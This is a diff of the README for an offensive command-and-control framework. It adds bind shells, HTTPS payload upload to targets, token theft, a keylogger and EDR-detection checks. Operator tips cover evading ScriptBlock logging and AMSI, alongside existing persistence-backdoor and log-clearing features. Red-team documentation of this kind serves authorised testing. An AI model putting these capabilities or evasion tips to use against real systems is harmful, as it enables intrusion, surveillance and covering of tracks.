@@ -45,7 +45,7 @@ Use this software only on systems you own or on systems where you have **explici
 
 ## Introduction
 
-TornadoRevC2 is a modular reverse shell management framework that accepts inbound connections over plain TCP, server-authenticated TLS, and mutual TLS (mTLS) with client-certificate verification, providing a unified operator console for session management, host reconnaissance, chunked file transfer, in-memory payload execution, SOCKS5 pivoting, plugin-driven post-exploitation, structured reporting, and a built-in `update` command for automatic Git-based updates and seamless handler restarts. Originally developed as a lightweight reverse shell handler, the project has evolved into an extensible framework in which capabilities such as firewall enumeration, credential store metadata collection, network mapping, browser profiling, and additional post-exploitation functionality are implemented as independent, modular plugins. The framework also includes the `make_token` plugin for establishing new C2 sessions via remote protocols (SSH, WinRM, SMB, WMI, MSSQL, DCOM, and MySQL/MariaDB) using command-line tools from the operator side, and an `upgrade_mtls` plugin that migrates a live session onto the mutual-TLS listener by pushing the handler's client certificate bundle to the target.
+TornadoRevC2 is a modular post-exploitation framework that accepts inbound reverse shell connections over plain TCP, server-authenticated TLS, and mutual TLS (mTLS) with client-certificate verification, and can also dial out to bind shells on targets. It provides a unified operator console for session management, host reconnaissance, chunked file transfer, in-memory payload execution, SOCKS5 pivoting, plugin-driven post-exploitation, structured reporting, and a built-in `update` command for automatic Git-based updates and seamless handler restarts. Originally developed as a lightweight reverse shell handler, the project has evolved into an extensible framework in which capabilities such as firewall enumeration, credential store metadata collection, network mapping, browser profiling, and additional post-exploitation functionality are implemented as independent, modular plugins. The framework also includes the `make_token` plugin for establishing new C2 sessions via remote protocols (SSH, WinRM, SMB, WMI, MSSQL, DCOM, and MySQL/MariaDB) using command-line tools from the operator side, and an `upgrade_mtls` plugin that migrates a live session onto the mutual-TLS listener by pushing the handler's client certificate bundle to the target.
 
 **Supported target platforms:** Linux and Windows (primary), with compatibility for generic Unix and BSD environments where applicable.
 
@@ -55,15 +55,15 @@ TornadoRevC2 is a modular reverse shell management framework that accepts inboun
 
 | Category | Capabilities |
 |----------|-------------|
-| **Session handling** | Multi-client TCP / TLS / mTLS listeners with automatic PKI bootstrapping · On-demand mTLS upgrade for live sessions · Interactive PTY/TTY shells · Session fingerprinting and reconnect tracking |
+| **Session handling** | Multi-client TCP / TLS / mTLS listeners with automatic PKI bootstrapping · On-demand mTLS upgrade for live sessions · **Bind shell support** — dial a target listening on TCP or TLS · Interactive PTY/TTY shells · Session fingerprinting and reconnect tracking |
 | **Operational security** | Shell history suppression on Linux and Windows · No `pty.spawn` or `Invoke-Expression` in command paths · Session-scoped probe markers · Jitter between automated commands · Host deny-list guardrails that refuse production-looking targets |
-| **File transfer** | Chunked upload and download · SHA-256 integrity verification |
+| **File transfer** | Chunked upload with resume · Chunked download with resume · SHA-256 integrity verification · Optional HTTPS transport (`--https`) with target-interface binding and callback address override |
 | **Payload execution** | In-memory execution for `py`, `ps`, `exe`, `elf`, `bat`, and `sh` — with memfd-based ELF execution (modern and legacy fallbacks) and subsystem-aware PE loading |
 | **Pivoting & tunneling** | SOCKS5 proxy through compromised sessions with automatic remote agent cleanup on stop · Soft and hard tunnel reset (`socks reset [--hard]`) · Ligolo-NG and Chisel agent deployment with background persistence |
 | **Remote session establishment** | `make_token` — establish new sessions over SSH, WinRM, SMB, WMI, MSSQL, DCOM, or MySQL/MariaDB from the operator side, with password / NTLM-hash / SSH-key / WinRM-client-certificate authentication, MySQL UDF auto-loading, custom-command execution, and netexec integration |
-| **Impersonation** | `runas` — execute commands or spawn a TLS-encrypted shell as another user, local or remote, with domain support and netexec integration |
-| **Enumeration** | Covering host triage, network posture, credentials and browser metadata, Kerberos tickets, Linux internals, and Windows domain and system configuration |
-| **Operational plugins** | Multi-pass secure file wiping · Hybrid file encryption · Shell history clearing · Windows event log clearing |
+| **Impersonation** | `runas` — execute commands or spawn a TLS-encrypted shell as another user, local or remote, with domain support and netexec integration · `steal_token` — list processes and owners, impersonate another process's token, or spawn a cmd / reverse shell running as the token owner |
+| **Enumeration** | Covering host triage, detection-environment preflight, network posture, credentials and browser metadata, Kerberos tickets, Linux internals (sudo configuration, writable filesystem targets), Windows domain trusts, WMI persistence, loaded modules, and Windows domain and system configuration |
+| **Operational plugins** | Multi-pass secure file wiping · Hybrid file encryption · Shell history clearing · Windows event log clearing · Cross-platform keystroke capture with window context |
 | **Persistence** | Cross-platform backdoor installation using TLS-encrypted payloads — cron `@reboot` on Linux/Unix, Run registry on Windows |
 | **Extensibility** | Runtime plugin load, reload, and unload · External plugins via `TORNADOREVC2_PLUGIN_DIR` · Documented `SessionContext` API |
 | **Reporting** | Per-session logging · Structured plugin output · HTML transcript export |
@@ -91,6 +91,7 @@ Operational plugins intentionally place artifacts on the target and document the
 - `persistence` — installs a reverse shell backdoor (cron `@reboot` / Run registry).
 - `upgrade_mtls` — pushes `client.pem`, `client.key`, and `ca.pem` to the target (removed by default once the new mTLS session is up).
 - SOCKS5 pivoting — deploys a Python agent to `/tmp` (Linux) or the Windows staging path, removed automatically on `socks stop` and on session cleanup.
+- Bind shell sessions — no artifact is placed on the target by the handler. The target already runs the listener; the handler only connects and manages the session.
 
 ### Graceful degradation
 
@@ -160,7 +161,8 @@ TornadoRevC2 does **not** claim to evade EDR, AMSI, ScriptBlock logging, or memo
 │  Sessions · Transfers · SOCKS · Plugins · Logging · Export ·    │
 │  update · Guardrails                                            │
 └────────────────────────────┬────────────────────────────────────┘
-                             │ reverse shell channel (TCP / TLS / mTLS)
+                             │ TCP / TLS / mTLS
+                             │ (reverse: target -> handler · bind: handler -> target)
                              ▼
 ┌─────────────────────────────────────────────────────────────────┐
 │                        Target Host                              │
@@ -180,6 +182,8 @@ TornadoRevC2 runs **three independent listeners simultaneously**, so implants ca
 | mTLS     | `9443`       | `-mp` | Mutual (client cert required) | `mtls_certs/` bundle (CA + server + client) |
 
 The `-H` flag sets the bind address shared by all three listeners. All three can be enabled at once; disabling one is not currently required — leave the port free or unbound to ignore it.
+
+The listeners handle inbound reverse shells. **Bind shells are outbound** — the operator dials them from the main prompt with `bind <host> <port>`. Once connected, the resulting session is managed through the same code path as a reverse shell and needs no additional setup.
 
 **Automatic certificate generation.** On first launch the handler creates two isolated directories and bootstraps the material it needs:
 
@@ -303,6 +307,16 @@ The `update` command is available from the main handler prompt only. It verifies
 | `sysinfo <ID> [--stealth\|--full]` | Collect or refresh host information |
 | `export <ID>` | Export an HTML session transcript |
 
+### Bind shells
+
+Bind sessions connect outward to a target that is already listening. Once connected, the session behaves identically to a reverse shell — same probes, same plugins, same transfers. `status` shows the direction (`TCP/BIND` vs `TCP/REV`).
+
+| Command | Description |
+|---------|-------------|
+| `bind <host> <port>` | Dial a plaintext bind shell |
+| `bind <host> <port> --tls` | Dial a TLS-wrapped bind shell (target must speak TLS — `ncat --ssl`, `socat OPENSSL-LISTEN`) |
+| `bind <host> <port> --tls --verify` | Same, but validate the target certificate against the system trust store |
+
 ### Plugins
 
 | Command | Description |
@@ -317,11 +331,42 @@ The `update` command is available from the main handler prompt only. It verifies
 
 ### File transfer
 
+All transfer commands accept a `--resume` flag (`-r`) to continue an interrupted upload or download from where it stopped. Resume is verified against the destination: the tail of the partially written file is compared byte-for-byte with the source, and the transfer restarts cleanly if the check fails.
+
 | Command | Description |
 |---------|-------------|
 | `upload [--resume] <ID> <local> <remote>` | Upload with chunked transfer |
+| `upload --https [iface] [-RH host[:port]] [--resume] <ID> <local> <remote>` | Upload over HTTPS |
 | `download [--resume] <ID> <remote> <local>` | Download with chunked transfer |
 | `verify <ID> <remote>` / `hash <ID> <remote>` | Verify remote file size and SHA-256 |
+
+**HTTPS upload flags:**
+
+| Flag | Description |
+|------|-------------|
+| `--https` | Use HTTPS transport instead of the default chunked/line-based path |
+| `--https <iface>` | Bind the operator-side HTTPS server to the named interface (e.g. `eth0`, `tun0`) or IP address. Default: `0.0.0.0` |
+| `-RH <host>[:<port>]` | Host and/or port the target should connect back to. Useful when the target reaches the handler through a NAT or redirector. Default: auto-detected from the bind interface or the reverse shell's local endpoint |
+
+The HTTPS upload uses the handler's existing `tls_certs/server.pem` and `tls_certs/server.key`. Targets skip certificate verification (self-signed cert). The Windows side uses `Invoke-WebRequest` with `-SkipCertificateCheck` on PowerShell 6+ or a `ServerCertificateValidationCallback` shim on 5.1. On Linux and Unix, the target command chain tries `curl -k`, then `wget --no-check-certificate`, then `python3` or `python` with an unverified SSL context.
+
+**Remote path resolution:** if the remote path refers to a directory (either ends with a separator, or exists as a directory on the target), the local file's basename is appended automatically. So `upload 1 ./report.md /tmp/` writes to `/tmp/report.md`, and `upload 1 ./report.md C:\Users\Alice` writes to `C:\Users\Alice\report.md`.
+
+**Example:**
+
+```bash
+# Default transport (line-based on Windows, chunked on Linux)
+upload 1 ./tool.exe "C:\Temp\tool.exe"
+
+# HTTPS transport, bind to eth0, advertise a public IP:port to the target
+upload --https eth0 -RH 203.0.113.5:8443 1 ./tool.exe "C:\Temp\tool.exe"
+
+# HTTPS with resume
+upload --https --resume 1 ./big.iso "C:\Temp\big.iso"
+
+# Download with resume
+download --resume 1 /var/log/auth.log ./auth.log
+```
 
 ### In-memory execution
 
@@ -346,6 +391,7 @@ Supported types: `py`, `ps`, `exe`, `elf`, `bat`, `sh`
 
 | Command | Description |
 |---------|-------------|
+| `bind <host> <port> [--tls] [--verify]` | Dial a target listening for a bind shell |
 | `payloads` | Display the built-in payload reference |
 | `update` | Check for updates from the official GitHub repository and restart after a successful fast-forward pull (requires Git; main menu only) |
 | `help` | Show the command reference |
@@ -355,7 +401,7 @@ Supported types: `py`, `ps`, `exe`, `elf`, `bat`, `sh`
 
 ## Built-in Plugins
 
-TornadoRevC2 ships with **51 built-in plugins** organized by function. All enumeration-related plugins are read-only unless noted otherwise.
+TornadoRevC2 ships with **59 built-in plugins** organized by function. All enumeration-related plugins are read-only unless noted otherwise.
 
 ### Host assessment & environment
 
@@ -368,6 +414,7 @@ TornadoRevC2 ships with **51 built-in plugins** organized by function. All enume
 | `filesearch` | Cross-platform | Search files by path, name, ext, size, owner, mtime (`run filesearch help` for options) |
 | `packages` | Cross-platform | Installed software, package managers, repository configuration, and recent installs |
 | `kerberosenum` | Cross-platform | Kerberos ticket metadata: caches, default principal, realm, TGT, service tickets, encryption types, flags (renewable/forwardable), keytab files, krb5.conf/registry config, and environment variables (no secrets) |
+| `preflight` | Cross-platform | Detection environment assessment: EDR/AV process scan (~45 known agents), PowerShell logging state (ScriptBlock, Module, Transcription), AMSI presence, Sysmon, LSA protection, Credential Guard, Defender realtime, Linux auditd rules, eBPF activity, SELinux/AppArmor, SSH session recording, PROMPT_COMMAND hooks. Renders a risk-assessment block before raw data. |
 
 > `sysinfo` is a handler command, not a plugin — see [Session management](#session-management).
 
@@ -404,6 +451,8 @@ TornadoRevC2 ships with **51 built-in plugins** organized by function. All enume
 | `journal` | Linux/Unix | Structured journalctl summaries: authentication, kernel, service failures, and recent events |
 | `sshaudit` | Linux/Unix | SSH server enumeration: effective sshd config, auth surface, pivoting options, host keys, authorized_keys, and CA trust |
 | `containers` | Linux/Unix | Container runtimes and workloads: Docker, Podman, containerd, CRI-O, LXC/LXD, and Kubernetes indicators |
+| `sudoers` | Linux/Unix | Sudo configuration audit: sudo version and rights (`sudo -n -l`), NOPASSWD entries, readable `/etc/sudoers` and `sudoers.d`, writable sudoers files, privileged group membership (sudo/wheel/docker/lxd/disk), pkexec presence for PwnKit correlation, and a privesc-candidate summary at the top |
+| `writable` | Linux/Unix | Writable filesystem audit: PATH directories and writable binaries, cron locations, systemd units, init scripts, profile scripts, ld.so config, `/etc/passwd` / `/etc/shadow`, logrotate, mail spools, and Docker socket. Produces a `findings` array with `kind` + `path` per entry |
 | `usersessions` | Cross-platform | Active local, remote, SSH, RDP, console, and service sessions with login/source metadata |
 
 ### Windows domain & system
@@ -423,6 +472,10 @@ TornadoRevC2 ships with **51 built-in plugins** organized by function. All enume
 | `drivers` | Windows | Installed drivers and kernel modules, signed/unsigned status, startup type, and notable security/VM drivers |
 | `powershell` | Windows | PowerShell version, execution policy, logging, modules, remoting settings, and profile paths |
 | `lsa` | Windows | LSA protection, Credential Guard, virtualization-based security, and credential security configuration |
+| `steal_token` | Windows | Token theft and impersonation: list processes and owners, impersonate another process's token (`--pid` / `--user`), spawn a process as the token owner (`--spawn` / `--spawn-cmd`), or spawn a reverse shell as the token owner (`--spawn-shell`). Not a collector — a C# helper (`_token_ops.cs`) loaded in-process via `Add-Type`. |
+| `wmi_activity` | Windows | WMI persistence enumeration: `__EventFilter`, `CommandLineEventConsumer`, `ActiveScriptEventConsumer`, `LogFileEventConsumer`, `NTEventLogEventConsumer`, `SMTPEventConsumer`, and `__FilterToConsumerBinding`. Flags suspicious payloads (base64, encoded commands, download strings, `mshta`, `rundll32`, known tool names). Checks WMI repository integrity and lists custom namespaces |
+| `trusts` | Windows | Domain trust relationships: `Get-ADTrust` with `nltest /domain_trusts` fallback. Reports direction, type, transitivity, SID filtering, forest-transitive, and selective authentication. Cross-references local Administrators for foreign principals, captures current user's SID history from group memberships, and produces an analysis block with actionable notes |
+| `dlls` | Windows | Loaded module audit for a specified PID (up to 200 modules). Flags unsigned, missing-on-disk (hollowing indicator), UNC-path, suspicious-directory (`%TEMP%`, `Downloads`, `Public`) module loads, and company/signer mismatches. Suspicious entries sorted to the top |
 
 ### Execution & operational
 
@@ -439,10 +492,17 @@ TornadoRevC2 ships with **51 built-in plugins** organized by function. All enume
 | `chisel` | Cross-platform | Deploy Chisel tunneling agent in reverse (client) or bind (server) mode; supports SOCKS5 and background persistence |
 | `persistence` | Cross-platform | Install a persistent reverse shell backdoor (cron @reboot / Run registry) using TLS-encrypted payload |
 | `upgrade_mtls` | Cross-platform | Push the handler's mTLS client bundle to a session and relaunch it over the mTLS listener (opt-in; does not affect other listeners) |
+| `keylogger` | Cross-platform | Keystroke capture with window context: `start` / `status` / `stop` / `fetch`. Windows uses PowerShell `GetAsyncKeyState` in a hidden process. Linux/Unix uses X11 XRECORD via ctypes (no external Python deps) with a `/dev/input` fallback for root or `input`-group users. Log rotates with the token; scripts and logs removed on `stop` unless `--keep-log` |
 
-> **`make_token` vs `runas`:** `make_token` establishes sessions *to other hosts* over remote protocols. `runas` executes *on the current host* as a different user.
+> **`make_token` vs `runas`:** `make_token` establishes sessions *to other hosts* over remote protocols. `runas` executes *on the current host* as a different user (requires credentials).
+
+> **`steal_token` vs `runas`:** `runas` requires credentials. `steal_token` reuses an existing logon token from another process on the same host — no credential input required, but admin/SYSTEM access is typically needed to reach the interesting tokens. `--pid` / `--user` impersonate the current thread (persistent only in interactive PowerShell sessions); `--spawn` / `--spawn-cmd` / `--spawn-shell` create an independent process that runs as the token owner and are the recommended, reliable modes.
 
 > **SOCKS reset modes:** `socks reset` performs a soft reset (relays aborted, remote streams purged, buffers cleared). `socks reset --hard` additionally kills the remote tunnel agent and redeploys it for a clean slate. Stopping a SOCKS proxy with `socks stop <proxy_id>` automatically removes the remote agent artifact and process when no other proxy uses the session.
+
+> **`preflight` is a pre-action check.** Run it before `steal_token`, `runas`, or any `inmemory` command. Its risk-assessment block tells the operator what will log the action before the action happens. If ScriptBlock logging is enabled, prefer `--spawn-shell` over PS-based flows; if AMSI is loaded and signed tooling is a concern, consider a different vector.
+
+> **`keylogger` is signatured by design.** The Windows side uses `GetAsyncKeyState`, a heavily monitored API. Use it on targets where the engagement accepts that cost, and prefer `--spawn-shell` from a stolen token so the process runs under a different identity. The plugin logs every action to the session log for engagement reporting.
 
 **In-memory execution methods:**
 
@@ -897,6 +957,14 @@ Every handler receives a `SessionContext` wrapping the handler and client socket
 | `rdp` | `plugins/windows/rdp.py` | Windows-only collector | Registry and firewall enumeration |
 | `virtualization` | `plugins/shared/virtualization.py` | Shared entry + split builders | Imports `linux/` and `windows/` builders |
 | `secrets` | `plugins/linux/secrets.py` | Linux-only collector | Platform-restricted listing |
+| `steal_token` | `plugins/windows/steal_token.py` | Windows-only custom handler | C# helper loaded via `Add-Type`; impersonation vs spawn modes |
+| `preflight` | `plugins/shared/preflight.py` | Cross-platform collector with custom formatter | Risk assessment rendered before raw data; ~45 EDR agent signatures |
+| `sudoers` | `plugins/linux/sudoers.py` | Linux-only collector | Privesc candidates summarized at the top of the report |
+| `writable` | `plugins/linux/writable.py` | Linux-only collector | Bounded directory walk; structured `findings` array |
+| `wmi_activity` | `plugins/windows/wmi_activity.py` | Windows-only collector | Suspicious-payload pattern matching against ~20 tokens |
+| `trusts` | `plugins/windows/trusts.py` | Windows-only collector | RSAT-first with `nltest` fallback; analysis block |
+| `dlls` | `plugins/windows/dlls.py` | Windows-only custom handler | Requires PID argument; signature + directory analysis |
+| `keylogger` | `plugins/windows/keylogger.py` | Cross-platform custom handler with subcommands | start / status / stop / fetch; state persisted per session |
 
 ---
 
@@ -951,9 +1019,6 @@ TornadoRevC2/
 │       ├── manager.py              Plugin lifecycle and execution
 │       ├── loader.py               Module discovery
 │       ├── shared/                 Cross-platform plugins
-│       │   ├── runner.py           Collector execution + jitter
-│       │   ├── inmemory.py         In-memory payload execution
-│       │   └── _win_pe_loader.cs   Windows PE loader (C#)
 │       ├── linux/                  Linux/Unix-only plugins
 │       └── windows/                Windows-only plugins
 ├── plugins/                        Optional external plugin directory
@@ -984,6 +1049,14 @@ python tornadorevc2.py -H 0.0.0.0 -p 4444 -tp 8443 \
 ```
 
 If the client connects using an IP address, the server certificate should include that IP in its **Subject Alternative Name (SAN)**. Avoid disabling hostname verification unless there is a specific reason to do so.
+
+### HTTPS file transfer
+
+The `--https` upload flag starts a transient HTTPS server on the operator side using the same `tls_certs/server.pem` and `tls_certs/server.key` used by the TLS listener. No additional certificates are generated. Targets skip certificate verification when downloading the file, so the CN of the certificate does not need to match the advertised host.
+
+The server binds to the address resolved from the optional interface argument (`--https eth0`), to `0.0.0.0` if omitted, or to a specific IP if passed directly (`--https 10.10.14.7`). The URL advertised to the target uses the `-RH` value if provided, otherwise the bind IP, otherwise the interface the reverse shell sees the handler on.
+
+The HTTPS server is torn down immediately after the transfer completes or fails. It does not persist between uploads.
 
 ### mTLS
 
